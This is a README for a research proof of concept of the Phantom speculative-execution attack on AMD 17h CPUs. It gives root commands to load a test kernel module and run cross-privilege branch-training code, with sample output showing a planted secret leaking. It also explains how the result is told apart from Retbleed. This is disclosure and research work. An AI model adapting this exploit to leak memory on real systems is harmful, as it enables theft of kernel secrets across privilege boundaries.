# Phantom Poc (AMD 17h)

- `./cp_bti`. Shows cross privilege boundary training possible by attacking the
    kernel module at `./kmod_retbleed_poc/`.

### Usage

```bash
make -C ./kmod_retbleed_poc install
sudo dmesg -t | tail -n4
# physmap_base ffff8c4a80000000
# kbr_src      ffffffffc167c827 <- This is where we will inject phantom branch
# kbr_dst      ffffffffc167c000
# ret is at    ffffffffc167c847 <- This is where the actual ret is.

make cp_bti
echo 1 | sudo tee /proc/sys/vm/nr_hugepages

sudo ./cp_bti
# rb.pa     27e800000
# rb.kva    ffff8c4cfe800000
# kbr_src   ffffffffc167c827
# kbr_dst   ffffffffc167c000
# last_tgt  ffffffffc167c800
# [.] bits_flipped; rb_entry; training_branch; signal
# [-] nbits=1
# [+] 100000000000000000000000100000000000000000000000; 06; 0x7fffc1e7c826; 0.90
# [+] 100000000000100000000000000000000000000000000000; 06; 0x7ff7c167c826; 0.70
# [-] nbits=2
# [-] nbits=3
# [+] 100000000000000000100000100000100000000000000000; 06; 0x7fffe1e5c826; 0.95
# [+] 100000000000000001000000100001000000000000000000; 06; 0x7fff81e3c826; 0.95
# [+] 100000000000000010000000100010000000000000000000; 06; 0x7fff41efc826; 0.95
# [+] 100000000000000100000000100100000000000000000000; 06; 0x7ffec1f7c826; 0.95
# [+] 100000000000001000000000101000000000000000000000; 06; 0x7ffdc1c7c826; 0.95
# [+] 100000000000010000000000110000000000000000000000; 06; 0x7ffbc1a7c826; 0.90
# [+] 100000000000100000100000000000100000000000000000; 06; 0x7ff7e165c826; 0.95
# [+] 100000000000100001000000000001000000000000000000; 06; 0x7ff78163c826; 0.50
# [+] 100000000000100010000000000010000000000000000000; 06; 0x7ff7416fc826; 0.90
# [+] 100000000000100100000000000100000000000000000000; 06; 0x7ff6c177c826; 0.95
# [+] 100000000000101000000000001000000000000000000000; 06; 0x7ff5c147c826; 0.90
# [+] 100000000000110000000000010000000000000000000000; 06; 0x7ff3c127c826; 0.95
# ...
```

### Confirm that it is Phantom and not Retbleed.

Looking at `./kmod_retbleed_poc/retbleed_poc.c`.

As seen in `disclosure_gadget`, the value of `rdi` is leaked, which is set by
`#define SECRET 6`.

As seen in `speculation_primitive`, right before the `ret`, `rdi` is set to
`14`. Hence, if we would be mispredicting the `ret`, we would be leaking `14`.


Printed by `sudo ./cp_bti` we're targeting `kbr_src   fff...827`. This is a nop:
```bash
objdump --disassemble=speculation_primitive ./kmod_retbleed_poc/retbleed_poc.ko 
```

The conclusion is that we're seeing phantom branches, i.e., branches on
instructions where this is no branch.
